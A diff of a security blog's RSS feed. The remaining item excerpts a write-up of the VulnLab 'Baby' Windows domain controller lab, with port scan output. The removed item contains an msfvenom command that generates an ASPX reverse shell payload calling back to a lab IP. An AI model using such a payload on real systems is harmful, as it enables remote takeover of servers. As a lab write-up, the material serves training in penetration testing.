@@ -16,13 +16,5 @@
       <description>Baby (VulnLab) Machine information Hostname: BabyDC.baby.vl Domain: baby Os: Windows Difficulty: Easy
 Rustscan Scan rustscan -a 10.10.109.97 -- -sV Open 10.10.109.97:53 Open 10.10.109.97:88 Open 10.10.109.97:135 Open 10.10.109.97:139 Open 10.10.109.97:389 Open 10.10.109.97:445 Open 10.10.109.97:464 Open 10.10.109.97:593 Open 10.10.109.97:636 Open 10.10.109.97:3269 Open 10.10.109.97:3268 Open 10.10.109.97:3389 Open 10.10.109.97:5357 Open 10.10.109.97:5985 Open 10.10.109.97:9389 Open 10.10.109.97:49664 Open 10.10.109.97:49667 Open 10.10.109.97:49668 Open 10.10.109.97:49674 Open 10.10.109.97:49675 Open 10.10.109.97:49838 Open 10.10.109.97:54940 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: baby.</description>
     </item>
-    <item>
-      <title>First Post</title>
-      <link>https://chr0ll0x0.github.io/posts/first-post/</link>
-      <pubDate>Fri, 03 Nov 2023 23:27:45 +0100</pubDate>
-      <guid>https://chr0ll0x0.github.io/posts/first-post/</guid>
-      <description>Hello this is a test
-msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=1337 -f aspx -o hamid.aspx </description>
-    </item>
   </channel>
 </rss>
